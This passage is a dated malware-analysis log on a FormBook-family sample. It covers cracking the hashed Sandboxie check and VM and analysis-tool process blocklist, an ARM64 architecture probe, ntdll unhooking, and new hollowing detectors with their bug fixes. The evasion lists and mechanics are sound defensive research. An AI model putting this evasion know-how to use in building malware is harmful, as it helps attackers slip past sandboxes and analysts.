crash.** The emulator's loader list carried none of the five WOW64 modules,
which every 32-bit process on 64-bit Windows has and the guest's `RegSvcs` does.
They are now in `EXTRA_MODULES` — a fidelity fix worth making regardless. It
changed nothing: `eax` is still `0` at `0x16054` and the run still survives. The
wow64 lookup is not what gates the store.

**And the correlation reinstates the pairing this document just withdrew.**
Rather than infer again, both sides were logged and matched by sequence: every
`0x2dc01` call with its hash argument, every `test eax, eax` at `0x16054` with
the value tested.

    branch at 17,328,197blk   eax = 0x00000000
    last lookup  0xe11da208   at 17,165,664blk
    blocks before: 0x2dc7e -> 0x2dc85 -> 0x2dc8c -> 0x16051

Those three blocks are `0x2dc01`'s not-found exit returning into `0x16051`, and
the 162k-block gap is simply walking and hashing 24 module names. **So
`0xe11da208` is the gate after all**, and the retraction of that pairing was
itself wrong. Correlating took one run; four inferences preceded it.

**Which leaves the contradiction sharp rather than resolved.** The gate is
`0xe11da208`; nothing the guest has loaded hashes to it; yet the guest stored
the constant. One of these is false and none of them is a guess any more.

**A structural fact worth having before the next attempt:** `0x32dfd514` does
**not** occur in the packed stage 3 at all, and occurs three times in the
unpacked code — `0x16065` (the store) and `0x0d809` / `0x2dca9`, both
`push 0x32dfd514 ; pushad ; call`. It is also strewn across the crash-time
stack. A magic pushed before a `pushad` and a call looks more like an error or
abort helper's argument than a buffer address, which would make the fault an
unhandled error path rather than a poisoned pointer. That is a lead, explicitly
not a conclusion — this section has four of those already.

> **RETRACTED by `0bd`, and the shape was the answer.** It is not an argument.
> `pushad`/`popad` balance and neither helper touches the stack above its own
> frame, so the trailing `ret` transfers to the *immediate*: both stubs are
> `call <helper> ; jmp 0x32dfd514`, proven by executing one. `0x32dfd514` is
> the author's **poison address** — the only immediate used that way anywhere
> in the image.

**The remaining measurement is on the guest, not the bench.** Log what `0x2dc01`
returns during a live run. Everything answerable from the artifacts here has
been answered.

### `0xe11da208` is `sbiedll.dll` — the gate is a Sandboxie check, 12 Aug

`crc32("sbiedll.dll") == 0xe11da208`. That is **Sandboxie's injected DLL**, the
most commonly checked sandbox artifact there is, and it is the value gating the
branch at `0x16054` that stores `0x32dfd514` and kills the process.

**So the crash is anti-analysis, and the reading changes from "plausible
crash-on-detection" to "a named product check".** The conditionality was already
established by the forged preimage; what was missing was *what it is looking
for*. A sample that poisons a pointer when it finds Sandboxie loaded is doing
exactly what the process blocklist three sections up is doing — and that
blocklist already contains **`sandboxiedcomlaunch.exe` and
`sandboxierpcss.exe`**. The same product, checked twice by two different
mechanisms, in two layers written independently of each other. That
corroboration is most of why this is worth believing.

**State the weakness too.** A 32-bit hash has preimages everywhere, so an exact
match is not by itself proof — `aqtd9dq.dll` matches equally well. The case
rests on the match *plus* the name being a real and famous artifact *plus* the
sample's existing Sandboxie entries. It is strong circumstantial identification,
not the algebraic certainty the GF(2) solve had.

**Verified in the emulator with the real name**, replacing the forgery:

    win32_emu_env: loader list includes 'sbiedll.dll' (crc32 0xe11da208)
    stopped: Invalid memory read (UC_ERR_READ_UNMAPPED) at eip 0x2003c53
    basic blocks: 17,347,692
    first fault: access 19 addr 0x32dfd514 eip 0x2003c53

Same fault, same address, same rva as the forged run at 17,304,968 blocks — the
small block delta is just the different name length being walked and hashed.
`RINGFORGE_FORGE_MODULE=1` now adds `sbiedll.dll` rather than `aqtd9dq.dll`, so
what happens past the gate is an **observation of the sample's anti-Sandboxie
path** instead of the behaviour of a machine that cannot exist.

**The contradiction does not resolve. It sharpens.** Neither inventory
contains anything matching `sbie` or `sandbox` — not the 931-name
`docs/guestloaded.txt`, not the 2,471-name host list now at
`docs/hostloaded.txt`. The guest was not running
Sandboxie, the lookup should have returned 0 exactly as it does under emulation,
and the guest stored the constant anyway. Naming the module removes the
possibility that this was some obscure module nobody thought to check; it makes
the remaining candidates from *Why it crashes* the whole field. **The guest-side
measurement — log `0x2dc01`'s argument and return during a live run — is now the
only thing that will settle it**, and it is worth more than it was this morning,
because we now know which single answer to look for.

**The bare-stem re-sweep itself found nothing, and that is the honest headline.**
Every corpus name is now expanded into full, one-extension-stripped and
all-extensions-stripped forms — 13,878 distinct candidates against 931 guest
and 2,471 host names, four host system directories and a tool list. Not one of the nine
open hashes fell to stems. `"wow64"` was a real lesson about sweep *inputs* and
it did not generalise. **What actually cracked `0xe11da208` was a missing corpus
*class*, not a missing spelling**: no quantity of System32 filenames, export
tables or tool process names contains `sbiedll.dll`, because it is a DLL that
*other* software injects. A PEB walk looking up modules by hash is looking for
injected modules, and the corpus had never contained any. Sweeping harder was
never going to do it; sweeping the right population did it immediately.

**`scripts/crack_name_hashes.py`** is the tool, and it is self-tested three ways
because a cracker checked only by whether it finds something will always find
something: 11 known name/hash pairs including `"wow64"` itself, the exhaustive
search made to rediscover `"wow64"` and `kernel32.dll`, and the composition
search made to rebuild `vmwareservice.exe`, `procmon.exe` and
`sandboxierpcss.exe` from morphemes. **Two of those self-tests failed first
time**, both the same bug — base-39 index digits reassembled in the wrong
direction — and the second one had been hiding behind the final `crc(cand) ==
target` guard as a *silent miss* rather than a wrong answer. The composition
search returned zero hits for every target when ~1.8 were expected by chance,
and it was that implausible cleanliness, not any failing assertion, that exposed
it. **A negative result at a rate far below its own noise floor is a bug
report.**

**The remaining eight now have a bound rather than a shrug.** Three searches, in
increasing generality:

| | |
|---|---|
| dictionary | 13,878 names, every stem and suffix form |
| exhaustive | **no preimage of ≤ 7 characters** over `[a-z0-9._-]`, bare or plus `.exe`/`.dll`/`.sys` |
| composition | up to 4 tokens from a 297-token vocabulary — 7.8 billion candidates — nothing but noise |

The exhaustive tier is the one worth quoting, and it is cheap because CRC-32 is
affine and its byte step invertible: meeting in the middle costs `39^ceil(L/2)`
rather than `39^L`, so the whole space to seven characters is seconds. Past
`L=6` the search stops being an answer — `39^L` against a 32-bit space passes
one expected accidental preimage there and reaches ~1,250 by `L=8` — so the tool
prints the expected collision count beside every hit and will not present
long-length noise as a finding. **`0x79dbe71d` and the seven blocklist names are
therefore each at least eight characters, or use a character outside that
alphabet.** That is a real constraint on the next attempt, and it is the first
time this document can say what those names are *not*.

### `0x79dbe71d` is `"sychpe32"` — and the hashes are substrings, not names — 12 Aug

**Read the next subsection first if you only read one.** The wordlist attack
below failed completely; what cracked this was reading the *call site*, and it
turned out the whole "what name is this" framing was wrong.

**A 230k-name corpus did not crack it.** The injected-DLL class that produced
`sbiedll.dll` was
widened to 235 entries across AV/EDR user-mode hooking, sandbox, VM guest
additions and instrumentation, a non-filename artifact list was added (window
classes, `\\.\` device paths, mutants), and — the big one — **every export of
every DLL in `System32` and `SysWOW64` was swept: 216,454 names off 7,063
files**, against the 12 DLLs `decode_name_hashes.py` originally used. Corpus
230,756 names. Nothing. A mixed-case exhaustive tier was added on the reasoning
that the ≤7-character lowercase bound says nothing about a name never
lowercased; it returned **exactly its own noise floor** (~17 hits per suffix
against 17.6 expected), which is the search working, not the search finding.

**What did move is knowing what kind of name it is, and that came from the
sample rather than from a wordlist.** `scripts/hash_call_sites.py` groups all 45
decoder sites by the function that consumes the decoded hash — one short forward
walk, since every site is `push key ; push obf ; call 0x2004181 ; push eax ;
call <consumer>`:

| consumer | sites | |
|---|---|---|
| `0x202a311` | 38 | the API resolver — these are the export names |
| `0x2026201` | 4 | |
| **`0x202fe41`** | **2** | **`0x79dbe71d` and `0x5c4ee455` — and nothing else** |
| `0x2026181` | 1 | |

`0x5c4ee455` is `"wow64"`, the bare stem. **Its only co-tenant is
`0x79dbe71d`**, which constrains the name far harder than any dictionary: it is
whatever kind of thing `"wow64"` is, checked by the same two-site pair.

**`0x202fe41` read out.** It takes `(hash, b, c, wide_name)`, returns 0
immediately if `wide_name` is null, then `movzx edx, word ptr [esi]` and a loop
copying **the low byte of each UTF-16 unit** into a `0x104` stack buffer —
narrowing a wide string to ascii — before calling `0x202fd51(hash, b, c,
ascii_name)`. Three things follow, and the third is the one to act on:

- The input is **UTF-16**, so it is a Windows name of some kind — a
  `BaseDllName`, a directory entry, or a `SystemProcessInformation` image name
  are all wide strings and all fit.
- It is compared as a **bare stem**: `"wow64"` hashes to `0x5c4ee455` while
  `wow64.dll` hashes to `0x80515ad9`, so either the caller strips the extension
  or `0x202fd51` does.
- **The narrowing does no case folding**, but `0x202fd51` does — `cmp al, 0x41 ;
  cmp al, 0x5a ; add al, 0x20`, plain ASCII `A-Z`. So the name is lowercase and
  the mixed-case tier was wasted work, which is worth saying because it was my
  idea and it cost a search.

#### The hashes are over fixed-length *substrings*, and the site says which

`0x202fd51` is not a name comparison at all. It lowercases the whole string into
a buffer, then **scans it for a fixed-length substring**: walk to each position
whose character equals `arg2`, copy `arg3` bytes from there into a second
buffer, hash that, compare to `arg1`. So `arg2` is the substring's **first
character** and `arg3` is its **exact length**, and both are pushed as
immediates at the call site in the clear.

    0x02026100  push esi              ; the wide name
    0x02026101  push 8                ; length
    0x02026103  push 0x73             ; 's'
    0x02026105  push 4                ; decoder key
    0x02026107  push 0x6992d626       ; obfuscated hash -> 0x79dbe71d
    0x0202610c  call 0x2004181

The `0x5c4ee455` site two instructions later is `push 5 ; push 0x77` — length 5,
`'w'` — and `"wow64"` is five characters starting with `w`. **The model is
confirmed by the hash we already knew before it was used to crack the one we
did not.** That ordering matters: the structure was validated against a known
answer first.

So the target is eight lowercase characters beginning with `s`, which the ≤ 7
bound had missed by one. `mitm(0x79dbe71d, unknown=7, prefix="s")` returns 34
candidates against ~32 expected by chance — and one of them is **`sychpe32`**.

**`crc32("sychpe32") == 0x79dbe71d`.** It is not a random string: on ARM64
Windows, `C:\Windows\SyChpe32` is the CHPE system directory, the architectural
sibling of `SysWOW64`. And the substring model explains why its partner is the
odd-looking bare `"wow64"` rather than `wow64.dll` — lowercased, `c:\windows\
syswow64` contains `wow64` at offset 14, and `c:\windows\sychpe32` contains
`sychpe32` at offset 11. Two substring probes of the same path.

| | | |
|---|---|---|
| `0x5c4ee455` | `'w'`, 5 | `"wow64"` — matches inside `syswow64` |
| `0x79dbe71d` | `'s'`, 8 | `"sychpe32"` — the CHPE directory |

**So this pair is not anti-analysis at all. It is an architecture probe** — *am I
x86-on-x64, or x86-on-ARM64?* — and `mov dword ptr [edi+0x728], 1` on the hit is
setting an architecture flag in the context. That is a real and necessary
question for this sample, because it does direct syscalls and process hollowing,
and the syscall gate differs between WOW64 and CHPE. It also means **the loader
is ARM64-aware**, which is worth knowing about a Formbook-family build.

**The standing lesson, third time in two days.** `"wow64"` was recorded here as
"a bare stem — re-run the sweeps with stems", and that was a wrong generalisation
from a correct observation: it is not a stem, it is a substring, and the sweeps
re-run with stems accordingly found nothing. Every one of these was cracked by
reading what the code does with the value, and none by a larger wordlist. The
call site had the length and the first character sitting in it as immediates the
whole time.

### The blocklist mechanism, fully mapped — and the section below retracted, 12 Aug

**The seven names are still not cracked. Everything else about them now is.**
All 20 constants **are** decoder output, from a contiguous run of 20
`0x2004181` call sites at `0x02016619`–`0x0201691a`, each feeding the compare at
`0x2026181`. The section below says the opposite, and it is **wrong** — two
compounding mistakes in my own tooling, both worth knowing because either one
alone silently produces a confident negative:

- **`hash_call_sites.py` walked a linear capstone disassembly.** Linear sweeps
  desynchronise on data embedded in the code stream, and the sites they skip
  are invisible rather than flagged. It is now matched on the instruction
  *encoding* — `E8 rel32` targeting the decoder, preceded by `68 imm32`,
  preceded by `6A imm8` or `68 imm32` — which cannot desynchronise.
- **The allocation keeps decrypting, and I scanned it cold.** 45 sites at ~47M
  blocks, **65 by ~380M**. All 20 blocklist constants are among the 20 that only
  exist late. The claim below that it is "still exactly 45 sites at 427M as at
  47M" was produced by the broken scanner agreeing with itself.

`hash_call_sites.py --late` now resumes `after_scan.state` and scans there;
it reports 20 of 20.

**The order is preserved, and it groups the unknowns.** Reading the sites by
address gives the list as the author wrote it:

| | |
|---|---|
| `vmwareuser`, `vmwareservice` | |
| **`0xd0c58467`, `0xa8d123c8`** | two unknowns *between the VMware pair and Sandboxie* |
| `sandboxiedcomlaunch`, `sandboxierpcss` | |
| `procmon`, `filemon`, `wireshark`, `netmon` | |
| **`0xc72ce2d5`, `0x0263178b`, `0x57585356`, `0x9cb95240`, `0x0cc39fef`** | five unknowns *among the analysis tools* |
| `vmsrvc`, `vmusrvc`, `python`, `perl`, `regmon` | |

That suggested two are virtualisation processes and five are analysis tools.
**The virtualisation reading was then tested hard and did not hold.** Three
searches on `0xd0c58467` and `0xa8d123c8`, each with a control that passes:

| search | scope | result |
|---|---|---|
| hand-listed VM names | 71 names × bare/`.exe`/`.dll` | nothing |
| generated | 5,788 stems from 33 vendor prefixes × 60 suffixes × 3 separators, ×5 forms = **28,940** | nothing |
| prefix-constrained exhaustive | 19 prefixes (`vm`, `vmware`, `vmware-`, `vbox`, `virtualbox`, `prl_`, `xen`, `qemu`, `sandboxie`, `hyperv`, `vmic`, …) × up to 6 unknown chars, **below the noise floor** | 57 candidates, all gibberish |

Controls: `crc32("vmwareuser.exe")` reproduces, the generator does produce
`vmwareuser`, and the prefix search rediscovers `vmwareuser.exe` from
`prefix="vmware"` with 4 unknown characters. So the method works and the answer
is not in that space.

**Which weakens the adjacency argument itself, and it deserved less weight than
I gave it.** The list is not strictly grouped: `vmsrvc` and `vmusrvc` are
Virtual PC processes sitting at positions 16–17, next to `python` and `perl`,
nowhere near the VMware pair at 1–2. Position is a hint about this author's
ordering, not a category label, and two slots being adjacent to VMware entries
does not make them VMware entries.

**No substring structure to exploit here.** Unlike the `0x202fe41` pair, the
compare is `cmp eax, dword ptr [ebp + 8]` against the hash of the *whole*
lowercased image name, reached by a two-argument call — no length and no first
character as immediates. So the `sychpe32` route genuinely does not transfer;
these have to be cracked.

**Brute force, with the constraint applied.** Every one of the seven has a stem
of ≥ 8 characters (verified: the ≤7 tier recovers `perl.exe`, `netmon.exe`,
`vmusrvc.exe`, `procmon.exe` and misses only `wireshark.exe` at 9). Restricting
the alphabet to `[a-z]` drops the noise floor to ~49 per target at stem length
8 — and all seven produced only noise there, so **no unknown is a purely
alphabetic 8-character stem.** At 9 and 10 the counts are 1,277 and 32,806, and
filtering for candidates containing two real tokens leaves nothing coherent.
They are long, and they likely contain a digit, underscore or hyphen.

**The mechanics that cost the most time**, both now fixed in the tools:
`after_scan.state` will not resume without `emu.repair_wow64_crash()` — without
it `resume()` returns `Invalid memory fetch at eip 0x0` and the block count
never advances, which reads exactly like a crash. And
`scripts/trace_blocklist.py` is how the compare was found at all: it arms on
`winenv.system_process_information` (safe to `emu_stop()` from inside — Unicorn
finishes the callback, so the buffer is still written), then runs a
per-instruction hook only in that window instead of over the 48M blocks before
it.

---

#### Superseded: "the call-site trick does not transfer" — retracted above

**They are not cracked.** The move that cracked `sbiedll.dll` and `sychpe32` was
to stop guessing populations and read the consuming code. Applied here it fails,
and it fails for a locatable reason: **there is nothing to read.** Four routes,
all measured, all negative — *and the third and fourth rows are the wrong ones;
see the retraction above*:

| route | result |
|---|---|
| the 20 constants as dwords in the cold unpacked blob | absent |
| as dwords in **any of 31 mapped regions**, sampled from 348M to 618M blocks — straight through the enumeration, including the 131 MB code region | absent |
| among the 45 `0x2004181` decoder sites, rescanned against the **late** image in case more code had decrypted (still exactly 45) | none decodes to a blocklist constant |
| the *names* as ascii or utf-16 strings in memory, same checkpoints | absent — every apparent hit was `perl` inside `properly` in ntdll's message table |

So the constants are neither stored, nor compare-immediates, nor decoder output,
nor derived from plaintext the sample holds. They are produced by some runtime
computation that has not been located, and locating it is the actual task —
**not another wordlist.** Note the shape of that last negative: it is the same
class of claim as `collection_available` in gap 4b. *Could not find where they
come from* is not *they are not there*.

**Two mechanics worth keeping**, both of which cost time to rediscover:

- **`after_scan.state` will not resume without `emu.repair_wow64_crash()`.**
  Without it, `resume()` returns `Invalid memory fetch at eip 0x0` immediately
  and the block count does not advance — which reads like a crash and is really
  an unrepaired capture point. `main()` calls it; anything hand-rolled must too.
- The allocation at 0x2001000 carries **the same 45 decoder sites at 47M blocks
  and at 427M**, so the "more code decrypts later" theory is dead for this
  region and a warmup-time scan is not missing sites.

**One real constraint did come out of it: every one of the seven has a stem of
at least eight characters.** The exhaustive tier covers stems of ≤ 7 with a
`.exe` suffix, and that is not an assumption — run against the known names it
recovers `perl.exe` (1 candidate), `netmon.exe` (3), `vmusrvc.exe` (24) and
`procmon.exe` (37), and only fails on `wireshark.exe` because its 9-character
stem is past the bound. The method demonstrably works on this exact shape, so
its silence on the seven is evidence about their length rather than about the
method. That puts them with `wireshark`, `vmwareservice` and
`sandboxiedcomlaunch` — the long, multi-word end of the list — which is also
where a 297-token composition search over 7.8 billion candidates found nothing.

### The published FormBook list identifies the blocklist — 12 Aug

**The sample's blocklist is the canonical FormBook 20-entry list, in the
canonical order, with six entries substituted.** Stormshield publishes the table
with hashes, and against ours **14 of 20 positions hash-match exactly** —
including position 14, which is where the one newly cracked name sits.

**`0x9cb95240` is `sharedintapp.exe`** — Parallels' *Shared Internet
Applications* process. Six of the seven remain, but they are no longer
anonymous: alignment names the slot each one fills.

| pos | published | ours |
|---|---|---|
| 3 | `vboxservice.exe` `0x276db13e` | **`0xd0c58467`** |
| 4 | `vboxtray.exe` `0xe00f0a8e` | **`0xa8d123c8`** |
| 11 | `prl_tools_service.exe` `0x21b17672` | **`0xc72ce2d5`** |
| 12 | `prl_tools.exe` `0xbba64d93` | **`0x0263178b`** |
| 13 | `prl_cc.exe` `0x2f0ee0d8` | **`0x57585356`** |
| 15 | `vmtoolsd.exe` `0x28c21e3f` | **`0x0cc39fef`** |

So this variant swapped out the VirtualBox pair, the three Parallels entries and
VMware Tools, and kept the other fourteen untouched. Whatever replaced them is
presumably the same *kind* of thing, which is the tightest constraint this
document has ever had on them — and the searches so far have still not found
them. Prefix-constrained exhaustive searches below the noise floor, over
`prl`/`prl_`/`parallels`/`coherence`/`vbox`/`virtualbox`/`vmware`/`tp`/`vg`/
`qemu`/`xen`/`vpc`/`hyperv` and more, return only gibberish for all six.

**The alignment corroborates the brute force, independently.** Our measured
constraints say every unknown has a stem of ≥ 8 characters and none is purely
alphabetic at 8. That *already* rules out `vboxtray` (8, alphabetic),
`vmtoolsd` (8, alphabetic) and `prl_cc` (6) sitting at those slots — which is
exactly what the hash mismatch says. Two unrelated methods agreeing is worth
more than either alone.

**And the published table independently confirms `sbiedll.dll`.** Stormshield
lists the module check as `SbieDll.dll`, hash `0xe11da208` — the same value this
project cracked from a corpus class rather than from a source. That crack was
circumstantial (exact hash plus a plausible name plus the sample's own Sandboxie
process entries); it is now corroborated by an outside analysis that never saw
this sample. Note also that the same write-ups describe FormBook hashing
*substrings* of usernames and paths, which is the mechanism found independently
at `0x202fd51` behind `"wow64"` and `"sychpe32"`.

**What this does not do is finish the job.** Six names remain, and the public
sources document the *canonical* list rather than this variant's substitutions.
The remaining routes are a sample-specific write-up of this exact variant, or
accepting the six as unrecoverable.

Sources: [Stormshield](https://www.stormshield.com/news/in-depth-formbook-malware-analysis-obfuscation-and-process-injection/),
[SentinelOne](https://www.sentinelone.com/blog/formbook-yet-another-stealer-malware/),
[FortiGuard](https://www.fortinet.com/blog/threat-research/deep-analysis-formbook-new-variant-delivered-phishing-campaign-part-ii).

### Two hollowing detectors, one new and one finally audible — 13 Aug

Both need no new collection and no detonation, and both were on the pick-up
list. 28 tests; the suite is 511.

**The WER image-timestamp check is new, and it is the cheapest hollowing signal
this pipeline has.** `app_timestamp` on Application Error 1000 is the
`TimeDateStamp` of the image that was *executing*, not of the file on disk. For
an ordinary process those are equal. For a hollowed one they are not — the
payload's header is what sits at the image base, and Windows reports it
faithfully. On run `3f70058b` Windows recorded **`5ff2b99b`** for `RegSvcs.exe`
while the guest's own `RegSvcs.exe` is **`68531ee1`**. The field was already
parsed. It had never been compared.

Why it earns a place beside the two dump-based passes rather than duplicating
them:

- **It does not need the fault to land in the injected region.**
  `executed_from_unmapped_memory` only fires when the fault address is in
  private memory; a hollowed process that dies inside `ntdll` looks ordinary to
  it and still has the wrong timestamp here.
- **It does not need a dump at all** — one event-log field, so it survives every
  way the dump watcher misses a short-lived process.

`read_pe_timestamp` reads the header structurally rather than through `pefile`:
two bounded seeks, no parse to raise on a malformed image, against whatever path
an event log happened to name. A missing or unreadable file is `no_reference`,
never agreement — and a test asserts an absent file returns `None` rather than
`0`, because **zero is a legal `TimeDateStamp`** and conflating the two would
make an unreadable file compare equal to a reproducible-build binary.

**The same guest-only caveat as `module_integrity` applies and is enforced.**
The comparison means something only where the file on disk is the file the
process ran. Off-guest every binary is a different build, so the summary reports
`available: false` and the report renders **Not Compared** rather than a clean
result.

**Module integrity is now in the HTML report.** It was JSON-only through its
first live finding, and that finding — an image at `0x400000` claiming to be
RegSvcs and demonstrably not being it — had to be read aloud out of
`memory\module_integrity.json`. A detector whose output nobody sees is most of
the way to not existing. `header_mismatch` renders with its own note that it is
reported *by identity, never by degree*.

**The tests target this project's most-repeated bug rather than the happy
path.** For both sections there is a test asserting that the uncollected render
differs from the clean render — a section that looks the same when nothing was
checked and when nothing was wrong is `collection_available` with a stylesheet.
And `WiredIntoThePage` renders the whole report, because a section function that
is never called from `body_html` is indistinguishable from one returning `""`:
every fragment-level test would still pass while the report stayed empty.

### The ntdll-unhooking pass and a real minidump reader — 13 Aug

Gap 5's last item and the last of pick-up item 4's three detectors. Suite 511 →
543 fast, 553 with `slow`.

**`dynamic_analysis/ntdll_unhooking.py`.** Every process has `ntdll` mapped by
the loader, which raises `Load Image`. A process that opens the **file** wants a
second, clean copy, and the usual reason is that the copy in memory has hooked
syscall stubs. This sample does exactly that — it maps a clean `ntdll` off disk
and calls `Nt*` out of its own copy, which is why hooking export addresses saw
nothing, and it does the `Wow64Transition` fixup itself at `0x202f457`.

`Load Image` is excluded deliberately and there is a test for it: counting it
would fire on every process on the machine. **Nothing here is scored**, and
`scored: False` is in the payload rather than only in a comment — reading
`ntdll` off disk is not by itself malicious, this has never run against a live
capture, and naming a detector before measuring what it fires on is the mistake
behind the `registry_create` 5 → 140 jump and the withheld gap-4b ATT&CK
mapping. The background count is kept for exactly that measurement.

**`dynamic_analysis/minidump.py` is the known-good reader.** The unloaded-module
list is why it exists, and the reason it defeated two hand-rolled attempts is
structural rather than careless:

    MINIDUMP_MODULE_LIST:            ULONG32 NumberOfModules;   // then 108-byte entries
    MINIDUMP_UNLOADED_MODULE_LIST:   ULONG32 SizeOfHeader;      // 12
                                     ULONG32 SizeOfEntry;       // 24
                                     ULONG32 NumberOfEntries;

Read the second like the first and the "count" you get is `SizeOfHeader`, the
entries start eight bytes early, and everything after shifts — which is how a
read produces a process id where a base address belongs. `test_unloaded_list_
read_as_a_loaded_list_is_wrong` pins that arithmetic instead of describing it.
Entry stride is taken from the file, never assumed, so a Windows that widens the
entry still parses; counts are clamped by the stream's own declared size, which
is the 7.6-quintillion failure mode closed directly.

**`pe_carve` now delegates to it**, so `_streams`, `_minidump_string`,
`read_modules` and `read_regions` keep their signatures while the structure
knowledge lives in one tested place. Being able to say the pipeline has *one*
dump reader is most of the point of the item.

### The 15 header mismatches: a stale fixture, and a real bug behind it — 13 Aug

Four `slow` tests in `test_module_integrity.py` were failing with 15 header
mismatches where 1 was expected. **Neither of my two guesses was right**, and
the answer was worth chasing because the second one is a live false negative in
the hollowing detector.

**The 15 mismatches were correct.** Not a false-positive class, not order
dependence, not resolution by name. The reference dump is cached in the system
temp directory and reused across runs; the cached one was written **10 Aug
17:30**, and `kernel32.dll` on this host was replaced **11 Aug 19:32**. A
Windows Update landed in between and swapped fourteen System32 DLLs. The dump's
module records genuinely disagreed with the files on disk, and the detector said
so. `SizeOfImage` matched on almost every one while `TimeDateStamp` differed,
which is exactly the shape of a serviced binary.

`_is_stale` now dates the cached dump against `ntdll`/`kernel32`/`kernelbase`/
`combase` and regenerates when servicing has overtaken it. The old comment said
a stale dump "shows up immediately as modules that no longer resolve to a
matching build" — true, and useless: it shows up as four failing counts that
look like a detector bug. A day went into deciding which it was.

**And behind it, the bug worth having found.** The identity mismatch was written
into a module-global `_MISMATCHED` dict during the reference lookup and read
back afterwards, with the cache eviction sitting between them:

    _MISMATCHED[key] = {...}                    # this module is not its file
    if len(_REFERENCE_CACHE) >= _CACHE_LIMIT:
        _REFERENCE_CACHE.clear()
        _MISMATCHED.clear()                     # including what was just written
    _REFERENCE_CACHE[key] = sections

So whichever module crossed the 96-entry limit **lost its `header_mismatch` and
was graded by degree instead** — precisely the outcome the comment on that
branch says must never happen, because a payload sharing most of its bytes with
the file it impersonates then files as `identical`. Any process with more than
96 distinct modules can reach it, and the crashed `RegSvcs` is small only
because it is a hollowing target; `explorer.exe` has hundreds.

Reproduced against the pre-fix code rather than argued from it:

    OLD, cold cache      -> mismatch recorded: True
    OLD, cache at limit  -> mismatch recorded: False   <-- the bug

Fixed by making the cache hold `(sections, mismatch)` as one value and returning
both — one dict cannot desynchronise from itself. That also removes the
cross-dump leakage the diagnosis exposed: `_MISMATCHED` still held an
`ntdll.dll` keyed `0xdeadbeef`, left over from the doctored dump in
`HeaderMismatchTests`, while the *clean* dump was being analysed.

`test_module_integrity_cache.py` pins it in four fast tests that need no
125 MB fixture, since the bug was never in dump parsing.

**The lesson is the one this document keeps relearning, in a new place.** The
failing tests looked like flakiness and the tempting fix was to loosen the
assertion. Doing that would have left a hollowing detector that silently drops
findings on any process with a hundred modules loaded.

### Run `d7cc5044`, 13 Aug — the event-log detector carried a run the dumps lost

Queue A's detonation. **Two of the three new detectors fired on real malware on
their first live run, and one of them fired precisely because everything else
failed.** Score 70 / Elevated Attention.

**The dump side of this run collapsed.** One dump succeeded all run — a
`parent-at-spawn` image of the sample itself at t24. The `+1s` scheduled dump
failed outright (*"Target process no longer running"*, plus a partial
`ReadProcessMemory`), `+25s` was still pending when the process exited, and
**`RegSvcs.exe` was never dumped at all**: pid 9132 sits in `missed_descendants`,
spawned 14:29:11.85 and dead by 14:29:14.88. **3.03 seconds.** Gap 3's problem,
recurring exactly as described, with the field built for it doing its job and
naming the process.

**And the WER image-timestamp check caught the hollowing anyway.**

    RegSvcs.exe (pid 9132)   recorded 0x5ff2b99b   on disk 0x68531ee1

The pre-registered prediction, exact. That check was argued for on the grounds
that *it does not need a dump at all* — one event-log field, so it survives
every way the watcher misses a short-lived process. This run is that argument
happening: the dump-based passes had nothing to work with and the event log
still proved a hollow.

**The ntdll pass fired too, also without a dump.** `RegSvcs.exe` opened
`SysWOW64\ntdll.dll` twice at 10:29:12 — self-unhooking, caught live, on the
process that had already crashed before anything could image it.

**Module integrity's prediction failed, and not because the detector is wrong.**
`header_mismatch on regsvcs.exe @ 0x400000` was not reported because there was
no `RegSvcs` dump to examine. 79 modules compared, all `identical` — correct for
what it was given. **This is the row that still needs a run**, and what it needs
is a dump of the child, not a change to the pass.

**Two contamination bugs, both found by first contact with live data, both
already known bug classes this pass failed to use the existing helper for:**

| | as run | fixed |
|---|---:|---:|
| `system_dll_opens_by_sample` | 41 | 11 |
| `ntdll_opens_by_sample` | 13 | 3 |
| `ntdll_opens_in_hollowing_target` | 2 | **2** — the finding, untouched |
| `system_dll_opens_by_others` | 60 | **2** |

`WerFault.exe` accounted for thirty of the forty-one opens credited to the
sample. It is *correctly* in the tree — Windows starts it as a child of the
crashed process — and it reads `ntdll` because that is what a crash reporter
does. `WINDOWS_RESPONSE_PROCESSES` documents this exact scenario and the pass
was not calling it. And `procdump64.exe`, **the pipeline's own dumping tool**,
supplied eighteen of the sixty background opens — the analyzer inflating the
very number meant to be this detector's false-positive baseline, for the fifth
time in this project's history.

The baseline going **60 → 2** is the material change. It is the number that
decides whether this detector may ever score, and it was 97% the pipeline
measuring itself.

**Registry reads were not collected**: the run used `dynamic_default.pmc`, so
gap 4b's finding path is *still* unexercised after three attempts. The guard
behaved correctly — `collection_available: false` with the note saying zero is a
statement about the collection and not about the sample — which is the only
reason this is a known gap rather than a false negative.

**All three new report sections rendered against real data**, which no test can
prove.

**What this run settles, and what it does not:**

| row | outcome |
|---|---|
| WER image-timestamp check | **Proven on real malware**, prediction exact, on a run with no usable dump |
| ntdll-unhooking pass | **Proven**, and its false-positive baseline measured at 2 after the fix |
| Module-integrity report section | Rendered live |
| `header_mismatch` on the payload | **Still unproven** — needs a dump of the child |
| module integrity `replaced` | Still never seen in the wild |
| Registry-read finding path | **Still unexercised**, wrong config for the third time |

**For the next run**, three things: offsets `1, 25, 55` rather than `1, 25`, the
Procmon config field actually pointed at `dynamic_registry_reads.pmc`, and the
knowledge that a 3-second child cannot be caught by any scheduled offset — if a
`RegSvcs` image is wanted, the crash dump via WER `LocalDumps` is the only route
that has ever produced one.

### The crash dump closes the last row of run `d7cc5044` — 13 Aug

The run's `cases\` directory was lost, but `C:\werdumps\RegSvcs.exe.9132.dmp`
survived because WER writes outside it. That one file settles the prediction the
run left open, and it did so **without a detonation** —
`python -m dynamic_analysis.module_integrity <dir>` over a dump already on disk.

    *** HEADER MISMATCH  regsvcs.exe @ 0x400000  (a process loaders hollow)
          loader says  timestamp 0x5ff2b99b  size_of_image 0x46000
          the file has timestamp 0x68531ee1  size_of_image 0xe000
          in memory     entry 0x2680  image_base 0x400000  sections 1
          99.10% of 25,420 bytes differ

Every value matches the 10 Aug finding independently, `entry 0x2680` included —
the entry point the emulator has been driven from all session. **So the row
failed this morning for the reason diagnosed and not for any fault in the pass:
there was no `RegSvcs` image to examine, and given one it reports the hollow.**

**The carver on the same dump shows the mechanism outright:**

| address | size | timestamp | what |
|---|---|---|---|
| `0x400000` | `0x46000` | `0x5ff2b99b` | stage 3, at `RegSvcs.exe`'s preferred base |
| `0x820000` | `0xe000` | `0x68531ee1` | the **real** `RegSvcs.exe`, .NET, relocated away |

Mapped alongside at the preferred base, confirmed on a second run and a second
sample of the same chain. Not overwrite-in-place.

